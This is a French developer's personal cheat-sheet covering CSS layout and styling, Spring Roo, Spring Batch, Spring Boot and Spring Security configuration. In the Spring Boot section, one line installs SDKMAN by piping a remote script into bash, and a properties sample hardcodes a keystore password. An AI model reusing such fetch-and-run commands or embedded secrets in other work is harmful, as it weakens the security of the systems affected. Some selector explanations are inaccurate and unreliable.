                                <div class="menu" onclick="sendPrompt(document.getElementById('publicites'),true);">Temoignages</div>
                                </div>
                          <div>A propos</div>
              </div>
pour exclure des classes :
        div:not(.one):not(.two):hover { //ni one ni two
        	border-radius: 0;
        }
pour que quand on clique sur un element ou quand on est dessus ca agit:
        :active ; :hover; :visited
pour faire un tooltip rapide
                  css:
                  .tooltipPere>.tooltipFils
                  {
                   display:none;
                  }
                  .tooltipPere:hover>.tooltipFils
                  {
                   display:inline;
                   }
                  .tooltipFils
                  {
                    position:absolute;
                    z-index:10;(// attention zindex ne marche que si on a specifie la position:(absolute relative etc...))
                    border:solid; 
                            // differents types de border : 
                              - none, aucune bordure, 
                              - dotted, bordure en pointille (sauf internet explorer), 
                              - dashed, bordure en tirets (sauf internet explorer), 
                              - solid, bordure continue, 
                              - double, bordure en double trait, 
                              - groove, bordure en creux, 
                              - ridge, bordure en saillie, 
                              - inset, bordure en 3d lumière basse, 
                              - outset, bordure en 3d lumière haute, 
                              - inherit, herite de son parent (css 2).)
                   background:yellow; 
                  }
                  html:
                  <strong class='tooltipPere'>
                    aaa
                  <div class='tooltipFils'>Ecouter cette boucle</div></strong>
pour qu'un element soit fixe et ne bouge pas quand on scrool: 
    left: 1362px;
    position: fixed;
pour rendre n'importe quel objet (div etc ) redimensionable par l'utilisateur :
    resize: both; ou horizontal ou vertical
profondeur : z-index:10;(// attention zindex ne marche que si on a specifie la position:(absolute relative etc...)
position calque layer profondeur par dessus par dessous : 
  il faut obligatoirement specifier 
  position:relative; ou absolute ou fixed ou... 
  z-index:1; // puis ensuite mettre ca aussi.  Plus chiffre grand plus proche de nous. // attention zindex ne marche que si on a specifie la position:(absolute relative etc...)
superposer deux images 
    background-image: url(bg1.png),url(bg2.png) no-repeat;
superposition d'image : 
    background-image: url("bulle.png"), url("background.png"); // le premier est le plus proche
    background-position: left top, left top;
pour que l'image background de fond prenne toute la place
  .fond
  {
	background: url(accueil.jpg) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
  }
pour que la taille du background s'adapte au div :
      background-size: 100% 25px
pour rendre n'importe quel objet (div etc ) redimensionable par l'utilisateur :
    resize: both;
effet de degrade: 
          .gradient-bg {
                background: #466368;
                background: -webkit-linear-gradient(#4A4C4B, #000000);
                background:    -moz-linear-gradient(#4A4C4B, #000000);
                background(-color):         linear-gradient(#4A4C4B, #000000); // a tester avec background-color             

          avant : 
             /* fallback/image non-cover color */
             background-color: #DDDDDD; 
          
             /* Safari 5.1+, Mobile Safari, Chrome 10+ */
             background-image: -webkit-linear-gradient(top, #A19D9A x%, #853B3B y%); top ou right ou left, couleur1 x%, couleur2 x%
               ainsi on peut enchainer les couleurs les unes à la suite des autres :
               -webkit-linear-gradient(left, #FFFFFF 5%, #FFFFFF 20%, #853B3B 20%, #853B3B 65%, #FFFFFF 65%)
              
          
             /* Firefox 3.6+ */
             background-image: -moz-linear-gradient(top, #A19D9A, #853B3B);
             background-image: -moz-linear-gradient(top, white 0%, #ccc 4%);
          
             /* IE 10+ */
             background-image: -ms-linear-gradient(top, #A19D9A, #853B3B);
          
             /* Opera 11.10+ */
             background-image: -o-linear-gradient(top, #A19D9A, #853B3B);
             
             
             /* Safari 4+, Chrome 1-9 */
             background-image: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#2F2727), to(#853B3B));

          }

un effet d'ombre :
    box-shadow: 1px 1px 2px #CFCFCF;
                0px 0px 0px 15px #B6171C
                gauche  droite blur taille(opt) couleur
pour faire une bordure de texte contour:
    text-shadow: #FFFFFF 1px 1px,#FFFFFF -1px 1px,#FFFFFF -1px -1px,#FFFFFF 1px -1px;
faire une transition, transformation animation :
        #masqueActeurs{
        autant faire direct transition: all 0.2s ease 0.1s;
          transition: opacity ou translate(3em,0) ou all 2s, (PUIS) height 3s ease; ou linear ou ease-out ou ease-in ou vitesse customisee: cubic-bezier(1.000, -0.530, 0.405, 1.425) // negatif revient en arriere
          -moz-transition: opacity 2s ease;
          -webkit-transition: opacity 2s ease;
          -o-transition: opacity 2s ease;
          pour une box-shadow c different: 
          transition: box-shadow 0.2s ease 0.1s;
            ici: vitesse de mouvement:(0.2s) vitesse de declanchement(delay):(0.1s)
          ...
utiliser les fonts telecharges du serveur: 
      @font-face
      {
        font-family: masque;
        src: url('Itali___.ttf');
      }
      (...)
    .toto:after
     {
       font-family: "masque";
           content: "\f069";
      }
      h2 {
          font-family: masque;
        	font-size: 1.5em;
        }
        
        

        
        
        
        
pour selectionner un nextSibing d'un element
        elementrepere + elementJusteACoteASelectionner
         Sinon utiliser plutot nextElementSibling si on veut exclure les textes
          
faire disparaitre un div layer au premier plan pour agir derriere : (voir javascript)
pour centrer direct:
  flexboxes : flex :flex-boxes :   // genial car peut etre complettement independant de la source html!
  .parent
  {
    display: flex; // si les fils sont des images, TOUJOURS les mettre dans des divs chacune
    justify-content: center; ou flex-start ou flex-end (gauche ou droite) ou space-between (equidistants)  ou space-around (espace au bord)
    align-content: center; ou flex-start ou flex-end (bas ou haut) ou stretch (fils prend toute la hauteur)
    align-items:center ou...// pour l'alignement du contenu verticallement
    flex-direction: row  ou row-reverse ou column ou column-reverse // transforme complettement le html quel qu'il soit! affichage bien centre en ligne ou colonne. ou bien flex-flow: row ou column ???
    flex-wrap: wrap ou nowrap ou wrap-reverse
  }
  enfants : jouer avec les width:x%; pour passer à la ligne et les padding pour les espaces 
      :nth-child veut dire selctionner element si :
          It is a paragraph element
          It is the second child of a parent
      :nth-of-type veut dire selctionner element si :
          Select the second paragraph child of a parent
  .parent>:nth-child(2)  // (queryselector utilise la meme syntaxe) le deuxieme fils de la liste. li:nth-of-child(n+6) selectionner tout sauf les six premiers. li:nth-child(-n+5)  selectionner les 5 premiers. li:nth-child(odd) selectionner seulement les pairs. li:nth-child(even) selecitonner seulement les impaires. li:last-child(2) selectionner le dernier. li:last-child selectionner l'avant dernier. div:nth-of-type(1) selectionner que le premier div. div:nth-child(1) ben en fait là div ne sert à rien puis qu'il selectione le permier element quel qu'il soit
  {                             voir http://www.w3.org/TR/CSS2/selector.html   LINKcsslkhkhkhkhkh
                                queryselectorAll ramene tous les elements correspondants alors que queryselector ne ramene que le premier
                               #toto c'est pour les id, .toto c'est pour la classe toto c'est pour la balise? [unattribut=valeurattrut] c'est pour par exemple name. LINKcssselectors
                               > c'est fils direct; " "(espace) c'est fils indirect ou direct
                               , (virgule)c'est pour "OU" et ;:first-child; :nth-child(2); element1+element2 cherche element2 precede par un element1;
                               rien sans espace c'est ET: #font.creer: c'est pour <div id="font" class="creer">
                            element(div par ex...)[monatribut] tout element ayant un attribut "monattribut"; element[monattribut=toto] tout element ayant un atribut ayant valeur toto: donc on peut l'utiliser pour name!!!! hahaha!
                            [monatribut] tout court: tout element ayant cet attribut "monatribut"
                            element^[monattribut] tout element commençant par mon attribut $:finissant par... *:contenant
                            
    -webkit-order:0; // on peut changer l'odre independamment de la source html!!! ici si je mets -1 le deuxieme fils passe avant le premier
  }
pour que tous les elements s'ajustent de facon bien organisee sans avoir à forcer indiquer la taille de mes elements. horizontal: % vertical: px
    min-width:338% super pour eviter les merdes sur petits ecrans
  .box >*
  {
    -webkit-flex:1 0 0px;
  }
  ou
  .box >:nth-child(2)
  {
    -webkit-flex:1 0 0px;
  }
  ou avant: 
    margin: 0 auto;
float:  right ou left;
    l'element se pos a drt ou gauche le plus possible dans son element pere le reste du flux prend sa place.
      donc faire plusoeurs colonees c simple: 
      .float {
              float: left;
              width: 25%;
              margin: 1em 0;
            }
les marges et les paddings: 
      marges entourent l'element: 
            	margin: 0% auto; veut dire : centre automatiquement avec un contour de 0%
              margin: 0% 0% 0% 0%; // sens des eguilles d'une montre
              text-align: center;      (dans ce cas pour les divs ne pas mettre display:inline mais display:block)
       padding c'est entre l'objet et lelement...  
pour mettre une image de fond : au centre 50% 50% vertical et horiz ou inverse:
              #page {
              background: url("background.png") no-repeat scroll 50% 50% #FFFFFF;
transparance: opacite
      .title 
      {
      background-color:#C2AB8C;
      opacity:0.6;
      }
      pour faire un effet de transparence: 
      opacity: 0.85;
  modifier le style de tous les inputs: 
            input ou que les input text par ex:  input[type=text] { 
            { 
            -webkit-appearance: button;
            -webkit-border-radius: 50px; //arrondir
            -webkit-box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.1);
            -webkit-padding-end: 20px;
            -webkit-padding-start: 2px;
            -webkit-user-select: none;
            border: 1px solid #AAA;
            color: #555;
            background-color: #C2AB8C;
            font-size: inherit;
            margin: 0;
            overflow: hidden;
            padding-top: 2px;
            padding-bottom: 2px;
            text-overflow: ellipsis;
            white-space: nowrap;
            }
  modifier le style d'un css:
               select {
            -webkit-appearance: button;
            -webkit-border-radius: 50px;
            -webkit-box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.1);
            -webkit-padding-end: 20px;
            -webkit-padding-start: 2px;
            -webkit-user-select: none;
            border: 1px solid #AAA;
            color: #555;
            background-color: #C2AB8C;
            font-size: inherit;
            margin: 0;
            overflow: hidden;
            padding-top: 2px;
            padding-bottom: 2px;
            text-overflow: ellipsis;
            white-space: nowrap;
            }
       # et .: 
        # c'est pour les id
        . c'est pour les classes.
    pour faire un effet de frame avec scrollbar verticale:
      dans le css:
        #slider pre {
            border:1px solid #CCCCCC;
            color:#666666;
            font-size:1.1em;
            margin-left:15px;
            overflow:auto; overflow-x ou y:hidden , scroll, auto
            ( - visible, rend visible tout ce qui depasse.
              - hidden, cache tout ce qui depasse.   
              - scroll, met toujours une barre de defilement verticale.
              - auto, met une barre de defilement verticale si besoin.
              - inherit, herite de son parent (css2).)
            padding:2px;
            width:600px;
            }
        dans le html:
        <div id="slider">
    	    <pre>
    			mon code dans le frame etc... <?php include_partial('objet/object_list', array('tal_objets' => $tal_objets)) ?>
    		</pre>
    	</div>  
    pour masquer le scrollbar :
                <div style="overflow: hidden;">
                 <div style="width: 100%; height: 100%; overflow: auto;  margin-right: 14px; padding-right: 28px; padding-bottom: 15px;">
                 <slot name="content"></slot>
                 </div>
                </div>
    Si les span font des retours chariot non souhaites:
    			leur ajouter l'attribut style css: display: inline; // inline si c du texte, block si c'est un div( avec une image par exemple)
    Utiliser les classes : <div class= « maclasse1 maclasse2 »> herite de classe1 puis classe2(override)
    Dans le css:
    .maclasse1         // attention les classes les plus bas du fichier css sont prioritaires sur les classes du dessus
    {
    //pour la disposition et la taille
    float:right;
    margin-left:500px;
    padding:5px;
    text-align:left;
    width:515px;
    // pour les contours
      border: 1px solid #FFFFFF;
      border-bottom-color: #C2AB8C;
      border-right-color: #C2AB8C;
    // pour la couleur de fond
    background-color:#D3E5FD;
    //pour l’image de fond
        background-image:url(../images/bg_body.jpg); // chemin relative au fichier css
        background-repeat: repeat-x, repeat-y;
    }
    .maclasse2
     {
    …
    }
    .maclasse2 .maclasse2
     {
     pour tous les elements maclasse2 qui sont SOUS les elements maclasse1
    }
    
     pour plusieurs choses
    h1, a, td, img etc etc
     {
    …border: 0 etc etc
    }
    
    css p1our les tableaux:
    table .tableau (la classe du tableau)
    {
    border: medium solid #000000;
    margin:0pt;
    padding:5px 0pt 0pt;
    }
    
    .tableau td, .tableau th (ne s'appliquera qu'au objets dans le tableau ayant la classe tableau)
    {
    	border: thin solid #6495ed;
    }
    car
    'ul .class1' concerne tous les <ul class="class1">.
    '.class1 ul' concerne tous les ul contenus dans des class1

cssgrid : pour faire des mises en page responsives
  .mondivparent{
    display:grid;
    grid-template-columns: 1fr 1fr; // on cree vraiment une grille avec lignes et colonnes comme un tableau
    grid-template-rows: auto 1fr 3fr; //fr c'est le facteur de flexibilité: autant mettre des pourcentages : 33.33% 33.33% auto
    grid-column-gap: 10px; // distance entre les colonnes
    grid-row-gap: 15px; // distance entre les lignes
    grid-template-areas: //facultatif on peut aussi utiliser ???2/3
      "title title" // title prend la place de 2 colonnes // attention a ne pas couper des areas sinon c'est invalid
      "min header"
      "main sidebar";  // mettre un point "." pour mettre une cellule vide
    }
    .undivfils{
      grid-area:header; // autant mettre direct style="grid-area:header;" sur la balise elle meme
    }
    .autredivfils{
      grid-area:title;
    }          
    .lastdivfils{
      grid-area:main;
    }                
bootstrap : (c'est de la merde. utiliser css grid cssgrid)
        <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">//  user-scalable=no pour empecher le zoom
        </head>
        <div class="container"> ... </div> // le root. Ne peuvent pas s'imbriquer. Largeur fixe.
        ou container-fluid //largeur s'adapte et prend toute la place
        dedans: rows puis cols

CSS grids : cssgrid : css grid :


SPRING :      https://start.spring.io/
Spring roo :
                        project --topLevelPackage com.transportadmin
                        persistence setup --provider HIBERNATE --database MYSQL
                        entity jpa --class com.transportadmin.domain.Place
                        field string --fieldName name
                        
                        entity jpa --class com.transportadmin.domain.Agency
                        field string --fieldName name
                        field string --fieldName description
                        field string --fieldName phone
                        field reference --fieldName place --cardinality MANY_TO_ONE --class ~.domain.Agency --type ~.domain.Place
                        
                        entity jpa --class com.transportadmin.domain.Price
                        field string --fieldName name
                        field string --fieldName service
                        field string --fieldName fullprice
                        field string --fieldName reducedprice
                        
                        field set --fieldName prices --cardinality ONE_TO_MANY --mappedBy agency --class ~.domain.Agency --type ~.domain.Price
                        field reference --fieldName agency --cardinality MANY_TO_ONE --class ~.domain.Price --type ~.domain.Agency
                        
                        entity jpa --class com.transportadmin.domain.Transit
                        field string --fieldName timearrived
                        field reference --fieldName place --cardinality MANY_TO_ONE --class ~.domain.Transit --type ~.domain.Place
                        field reference --fieldName departure --cardinality MANY_TO_ONE --class ~.domain.Transit --type ~.domain.Departure
                        
                        entity jpa --class com.transportadmin.domain.DayWeek
                        field string --fieldName name
                        
                        entity jpa --class com.transportadmin.domain.Departure
                        field string --fieldName timedeparture
                        field string --fieldName description
                        field string --fieldName phone
                        field reference --fieldName place --cardinality MANY_TO_ONE --class ~.domain.Departure --type ~.domain.Place
                        
                        field set --fieldName prices --cardinality ONE_TO_MANY --mappedBy departure --class ~.domain.Departure --type ~.domain.Price
                        field reference --fieldName departure --cardinality MANY_TO_ONE --class ~.domain.Price --type ~.domain.Departure
                        
                        field set --fieldName departures --cardinality ONE_TO_MANY --mappedBy agency --class ~.domain.Agency --type ~.domain.Departure
                        field reference --fieldName agency --cardinality MANY_TO_ONE --class ~.domain.Departure --type ~.domain.Agency
                        
                        field set --fieldName transits --cardinality ONE_TO_MANY --mappedBy departure --class ~.domain.Departure --type ~.domain.Transit
                        
                        field set --fieldName dayweeks --type ~.domain.DayWeek --cardinality MANY_TO_MANY --mappedBy departures --class ~.domain.Departure
                        field set --fieldName departures --type ~.domain.Departure --cardinality MANY_TO_MANY --class ~.domain.DayWeek
                        
                        
                        controller all --package com.transportadmin.web
                ajoute langue : web mvc install language --code it              

springintegration : spring-integration : spring integration :
  Message = id+header(metadonees)+payload(objetJavaDonnees) 
              Message<T>
                  |_GenericMessage<T>
  Source<T>--->devient un Message<T>pouvant etre lu.                      
    |_FileTarget ou JmsTarget etc...
  Aggregator:PlusieursMessages isoles -> un seul message 
  Filter/pipe: message->|pipe1|Filtre1(co un processor)|pipe2|Filtre2(co un processor).... 
      Translator: c un type de filtre: messageAuFormatType1->Translator->messageAuFormatType2
  MessageChannel: pipe où transite le message  
  MessageEndpoint:data-|MessageEndpoint|->message formatte ;  message formatte-|endpoint|->data 
 

Springbatch : spring-batch : spring batch :
<job id="eatJob" xmlns="http://www.springframework.org/schema/batch">
    <step id="stepCook" next="stepEntries">
      <tasklet
       task-executor="taskExecutor" throttle-limit="20"> // facultatif : si je mets, il va autoriser que x thread à la fois. SI je ne mets pas il fait 4 threads max à la fois par defaut si handler task-executor=un bean async. Si il est sync ça n'est pas pris en compte je crois
    
        throttle-limit=3>
        <chunk reader="cookReader" writer="cookWriter" processor="cookProcessorILESTPOSSIBLEDENENCHAINERPLUSIEURS" commit-interval="1" /> //d'abord le reader,puis processor;puiswriter SONT chacun des beans voir LinkBB ci dessous
          <listeners> // sont executées à la fin du step je crois.
            		<listener ref="customStepListener" />           classes implementent : StepExecutionListener
            		<listener ref="customItemReaderListener" />                            ItemReadListener
            		<listener ref="customItemWriterListener" />                            ItemProcessListener
    	    </listeners>                                                                 ItemWriteListener
      </tasklet>                                                                       ChunkListener
    </step>                                                                            SkipListener
    <step id="stepEntries" next="stepMeat">
 			<partition step="unAutreStepQuiEstExecuteNow!ApresLaPartition" partitioner="unBeanQuiImplementPartionnerOuEtendUnPartionnerAutre">
				<handler grid-size="20" task-executor="sirhTaskExecutor"/>        <bean id="sirhTaskExecutor" class="org.springframework.core.task.SimpleAsyncTaskExecutor(plusieurs threads) ou SyncTaskExecutor (un seul thread)">
			</partition>                                                       		<property name="concurrencyLimit" value="20" />
		</step>                                                             	</bean>	 
    </step>
    <step id="stepMeat" next="stepWine">
      <tasklet ref="drinkSomeWine" />  // une tasklet doit etre dans un step (je crois). indep des items. ref est un bean d'une classe implementant Tasklet, ma meth "execute" renvoit RepeatStatus.FINISHED
    </step>
    <step id="stepWine" next="clean">
      <tasklet>
        <chunk reader="wineReader" writer="wineProcessor" processor="wineWriter" commit-interval="1" />
      </tasklet>
    </step>
    <step id="clean">
        <tasklet ref="cleanTheTable" />
    </step>
  </job>
  LinkBB: 
  <bean id="cookReader" class="com.hraccess.job.synchro.service.batch.item.reader.EmployeeUpdateItemReader" scope="step">
		  <property name="stepExecution" value="#{stepExecution}" />
		  <property ...>
	</bean>
  <bean id="cookProcessorILESTPOSSIBLEDENENCHAINERPLUSIEURS" class="com.hraccess.job.synchro.service.batch.item.processor.EmployeesActifParPaysProcessor" scope="step">
    		<property name="employeesProcessor" ref="employeeUpdateItemProcessor" />
    		<property ...>
    	</bean>
    <bean id="employeeUpdateItemProcessor" class="com.hraccess.job.synchro.service.batch.item.processor.EmployeesProcessor" scope="step">
		  <property name="stepExecution" value="#{stepExecution}" />
		  <property name="unautreprocessor" ref="unautreprocessor" />
		  <property name="encoreUnAUtreProcessor" ref="encoreUnAUtreProcessor" />
		  <property name="prefilters">
			<list> // pour faire des listes avec spring
			<ref bean="DSNExpatExcludeProcessor" /> // on pourrait mettre ici plusieurs processor(voir après dans la classe...)
			<ref bean="confidProcessor" />
			</list>
		</property> 
	</bean>

      mapping d'une classe A en une classe B
      public class MaClasseItemProcessor implements ItemProcessor<ClasseA, ClasseB> 
      {
              @Override
          public ClasseB process(final Classe1 person) throws Exception 
          {
              final String firstName = person.getFirstName().toUpperCase();
              final String lastName = person.getLastName().toUpperCase();
              final ClasseB transformedPerson = new ClasseB(firstName, lastName);
              log.info("Converting (" + person + ") into (" + transformedPerson + ")");
              return transformedPerson;
          }
      }            
Partitionner divise par bloc d'items. P Creer map d'ExecutionContext=1session(key/value) pour 1 step.
    public class ColumnRangePartitioner implements Partitioner 
    {
      public Map<String, ExecutionContext> partition(int gridSize) 
      {
        creer un Map<String, ExecutionContext> 
               for (List<Employee> sublistEmployee : sublistEmployees) 
               {
                    ExecutionContext value = new ExecutionContext();
              			value.putInt("minValue", sublistEmployee.get(0).getEmployeeId().getNudoss());
              			value.putInt("maxValue", sublistEmployee.get(sublistEmployee.size() - 1).getEmployeeId().getNudoss());
              	}
        return ce Map
      }
    }
    
installer nouveau projet springboot CLI avec sdkman :
    dans un repertoire faire 
         curl "https://get.sdkman.io" | bash
         demarrer sdkman : /home/lduverge/.sdkman/bin/sdkman-init.sh (je crois)
         sdk install springboot
         spring --version
         . ~/.sdkman/candidates/springboot/current/shell-completion/bash/spring
          spring <HIT TAB HERE>
    
SPRINGBOOT :Spring-boot : start spring io (on peut aussi faire un projet avec un serveur jetty embedded sans spring-boot. Voir D:/RD/sampleWebappJettyEmbedded)
        pour une appli war sans tomcat embedded embarqué mais déployable en war: utiliser maven-war-plugin (pas sur que ça marche d'apres quentin) avec <packaging>war</packaging> + application.properties dans /webapps/config Sinon changer ou il vas chercher ton fichier de conf dans le tomcat en ajoutant:-Dspring.config.location=/path/to/config/file  
  si j'ai ce message ** WARNING ** : Your ApplicationContext is unlikely to start due to a @ComponentScan of the default package.
        je dois mettre mes classes dans un package
  de nombreuses proprietes de spring-boot sont dispos là 
        https://docs.spring.io/spring-boot/docs/current/reference/html/common-application-properties.html
  dans resources/application.properties 
        debug=true(pour debugger debuger)  et toutes les proprietes sont récupérables dedans de partout avec  
                        @Autowired
                        Environment env; puis env.getRequiredProperty("une.propriete.dans.applicationproperties"); 
 si erreur Error configuring: org.springframework.boot:spring-boot-maven-plugin. Reason: Unable to retrieve component configurator for plugin configuration
      passer à la version maven3
demarrer un batch tout simple avec spring-boot 
    à la classe que je veux qu'elle execute une methode quand spring-boot demarre: j'implemente l'interface CommandLineRunner: la methode run va s'executer automatiquement après demarrage.
    l'argument que j'ai passe en demarrant spring-boot va dans la methode run(arg) automatiquement :-)
  mise en place securite (application.xml)
        ca securise aussi un webservice machine-machine
          # Securisation basic 
          management.security.enabled=false
          #logging.level.*=DEBUG # marche pas: autant mettre un logback.xml dans resources et c bon.
          #security.user.name=
          #security.user.password=
          #profile pour les @
          spring.profiles.active=oracle
          #server.tomcat.basedir=
          server.port=8090
          server.ssl.key-store=classpath:dgac2.p12
          ou
          server.ssl.key-store=config/dgac2.p12 //chemin relatif à la racine du projet/du jar ou /pour/chemin/absolu
          #mot de passe du keystore
          server.ssl.key-store-password=mdpmdp
          #que si keystore de type pkcs12
          server.ssl.keyStoreType=PKCS12
          # que pour les trousseaux de cles non pkcs12. Attention ne pas le mettre si la cle n'a pas de mot de passe. Meme pour jks 
          #server.ssl.key-password=mdpclecertif 
          # facultatif si qu'un seul certif prive dans trousseau
          #server.ssl.key-alias=aliasDuCertifCreeMonTrousseau
          # que si pas pkcs12 ou la cle privee a un mot de passe aussi 
          #server.ssl.key-password=
          #TODO:
          #server.tomcat.remote-ip-header=102.54.94.97
          #server.tomcat.propocol-header=102.54.94.97
          #server.tomcat.internal-proxies=292\\.168\\.\\d{1,3}\\.\\d{1,3}

demarrer sur tomcat auto :
                ./maven spring-boot:run
                ou
                maven clean package pour builder mon jar puis 
                java -jar build/libs/monjar.jar
                peut etre besoin de mettre dans pom : ci dessous ou bien mvn spring-boot:repackage(un truc approchant) 
                	<build>
                          		<plugins>
                          			<plugin>
                          				<groupId>org.springframework.boot</groupId>
                          				<artifactId>spring-boot-maven-plugin</artifactId>
                          				<configuration>
                          					<executable>true</executable>
                          				</configuration>
                          				<executions>
                          					<execution>
                          						<goals>
                          							<goal>repackage</goal>
                          						</goals>
                          					</execution>
                          				</executions>
                          			</plugin>
                          		</plugins>
                          	</build>
 
maven: 
              <parent>spring-boot-starter-parent : pas besoin specif versions dans maven
              <build><plugin> springbootstarttomcat doit etre provided
              <dependance>springbootstarterdataJpa // inclue tous : Hibernate, trasaction jdbc etc...
              <dependance>spring-boot-starter-test
    declarer le parent permet de ne pas à avoir à specifier les versions dans maven
    si dans maven j'utilise les dependances springboot c cool car il s'occupe de creer les dependances necessaires lui meme : (hibernate etc...)
            classe main
    @SpringBootApplication // trouve les composants annotes par rapport au package de cette classe (dedans et en dessous) +  cette classe devient une classe de configuration où on declare ses beans singletons... //Pas besoin de web.xml. C'est @Configuration (cette classe est une classe de config)+@EnableAutoconfiguration (scan les beans du meme package et enfants + recup les proprietes+ scan les jars poses par mapresents dans classpath) + @Enablemvc (Existe si mvn dependance "spring-web-mvc") + @ComponentScan(basePackages={"..."}) scan les composants.
     @EnableWebMvc // a mettre aussi dans springboot a cote de ci-dessus si je fais des webservices                                                                                                                                                                =@ComponentGENERIQUE_EVITER_D_UTILISERUtiliser@Named+@Config+@Value (cherche proprietes sous classpath) @Value("${uneval}") ou @Value("${property:valeurpardefautsipastrouve}") String toto; cherche dans *.properties :property=xxx AUTREMETH:@ConfigurationProperties(prefix="connection" ou "connection" tout court) Cette annot peut etre sur une classe Tatato avec getter et setter qui selon nom des champs, les remplis à partir de *.properties (si contient connexion.tata) : Tatato a comme getter : tata se rempli tout seul pour que ca marche besoin que ma classe config ait : @EnableConfigurationProperties(Tatato.class)@ConfigurationProperties peut aussi accompagner un @Bean au dessus d'une methode
    @EnableResourceServer // active la securite JWT : ce micro service n'est accessible que si on lui envoie un JWToken ( De plus de manière plus fine on peut proteger alors des methodes avec au dessus @PreAuthorize("#oauth2.hasScope('un.scope.defini.dans.le.JWToken.entrant')") Mais besoin alors d'ajouter dans src/main/resources/application.yml où est la cle publique:jwt.keyUri:$xxxx/ma_cle
                public class Application { // l'executer demarre tomcat                                                                                         
                                                                                                                                                                
                    public static void main(String[] args) {                                                                                                     
                        SpringApplication.run(Application.class, args);                                                                                                                                                                                     
                    }                                                                                                                                                                                                                                                    
                    @Override
                    public void addResourceHandlers(ResourceHandlerRegistry registry) {attention peut etre que quand je veux utiliser ça je ne dois pas mettre @EnableWebMvc
                        registry.addResourceHandler("/**.html").addResourceLocations("file:path/to/your/static/html"); // si je veux que mes resources statiques static soient externalisées hors du jar
                        registry.addResourceHandler("/css/**").addResourceLocations("file:path/to/your/static/css");
                        registry.addResourceHandler("/static/**").addResourceLocations("/static/");
                    }                                                                                                                                                                                                                                            
                }
                
les fichiers de prop sont dans le classpath: (src/mainOuTest/resources/xxx.properties ou à l'exterieur à condition d'etre à cote du jar et le path de s'appeler "config" config/application.properties). Possible changer path et nom application.properties en settant la variable d'environnement(java -jar etc... --springconfig.name=xx) spring.config.location=autrepath/(/àlafin) et spring.config.name=xxx.properties; exemple: System.setProperty("spring.config.name", "accounts-server");                 
                    
 pour les repository (generations auto des requetes)
        utiliser interface MonRepository extends JpaRepository<MonObjet,Long>{ // tous les find, findbyid sont dispos pour moi. (voir page 14 http://communities.corp.sopra/sites/COMM_ARCHI/_layouts/15/WopiFrame2.aspx?sourcedoc=/sites/COMM_ARCHI/Librairie/20%20Journees%20des%20architectes/2016/2016-06-21-Triangle-Axway/0005-%20Gauthier%20Peel%20-%20Pres-tuto-REST.pptx&action=default&DefaultItemOpen=1)
                                                                                                                                      
        }     
spring security : spring-security : springsecurity :
          https://docs.spring.io/spring-security/site/docs/3.0.x/reference/core-services.html#core-services-authentication-manager
          https://docs.spring.io/spring-security/site/docs/3.0.x/reference/technical-overview.html reprendre à Access-Control (Ahtorization) in Spring Security
        pour une connexion d'emblee comme du sso: recuperer depuis le request le principal car déja dans hraspace qui appelle via une iframe mon application : voir D:\Profiles\lduverge\workspaceAgentDeSynchroSPEIG\hr-import-excel-speig\src\main\webapp\WEB-INF\spring\security\hraspace\security-context.xml
    initialise dans appli web par:
      web.xml:
      <filter>
                <filter-name>springSecurityFilterChain</filter-name>
                <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
        </filter>
        <filter-mapping>
                <filter-name>springSecurityFilterChain</filter-name>
                <url-pattern>/*</url-pattern>
        </filter-mapping>
      ... 
      pour gerer nombre de session max : ou oautre... 
      <listener><listener-class>...HttpsessionEventPublisher ... voir doc spring
      security XML STYLE:
        *ùù*<global-method-security secured-annotations="enabled"> si securedannotations: je peux alors mettre @Secured("UN_ROLE") devant une methode java. C'est AccessDecisionManager :par defaut qui gère ça les decisions d'accès en fonction du rôle ou autre. SI je veux l'ecrire moi-meme mettre: access-decision-manager-ref="monBeanAccessDecisionManager" on peut aussi le mettre dans un bean filtre
                facultatif mais puissant pour def les authorisations dans le code:
                    <protect-pointcut expression="execution(regexpNomMethodeAProteger regexpNomPackageEtNomClasseAProteger(..)" access="UN_ROLE"/>
                    <protect-pointcut expression=etc... du plus specifique là haut au moins specifique en bas        
            </global-method-security> 
            <!-- pattern:** inclue les / et pas * -->        
        <security:http pattern="/unPathSansSecurite/**" security="none" OU facultatif: comme pour protect-pointcut ci dessus pour affiner securite des URL definir mon propre AccessDecisionManagerBean: access-decision-manager-ref="monBeanAccessDecisionManager" facultatif: entry-point-ref="grantCustomEntryPoint"/>
        Si je ne met pas de pattern c comme si je faisais pattern="/**" et là attention car tous les <security:http patterns plus precis en dessous sont ignores. Si je ne met pas security="none" je suis oblige de mettre un filtre de SECURITE:
        <security:http auto-config="true" def la chaine de fitres de secu par defaut et ajoute automatiquement dans cette balise : <form-login login-page='/formulairedauth.jsp' login-processing-url="/action_facultatif_c_laction_suite_au_submit" default-target-url='urlQdOnVientDetreAuth.html'/><http-basic (pourUnPromptBrowser)/><logout/>(P les ecrire nous mm pour overrider le default)
        <security:http pattern="/xxx/web/**" use-expressions="false">//si use-expressions est à true alors ci dessous les access= peuvent contenir des Spring EL expressions, exemple: access="hasRole('admin') and hasIpAddress('192.168.1.0/24')">
              <session-management invalid-session-url="/pageDuTimeout.html"/> //c1filtre: pour redirection vers cette page si session timeout
              autres filtres P param  ici: voir doc spring les namespaces
              <security:custom-filter position="FORM_LOGIN_FILTER par ex" ou before/after="FORM_LOGIN_FILTER" LINK(*55*) ref="monBeanCustomFiltreFacultatifSiCetteBaliseEstDansUnFiltreOuUnEntrypoint" after ou before(optionels: pour inserer au lieu de remplacer)/> je remplace le formloginfilter par mon filtre ms attention à ce que le filtre que je remplace n'est pas dutout utilise. Tous les autres filtres restent valables.LINK(*55*)): positionne un filtre ou un entrypoint à CETEMPLACEMENT
                    si je remplace un filtre qui a un entry-point je dois definir mon entry-point au niveau de la balise parente security:http. Ci-dessous: lu du haut vers le bas
              <intercept-url pattern="/xxx/web/login.jsp" access="IS_AUTHENTICATED_ANONYMOUSLY" ou filters="none"(n'est plus supporte en 3.1. si il est utilise je dois le faire le plus long possible!/a/b/c)/> tout le monde y accède
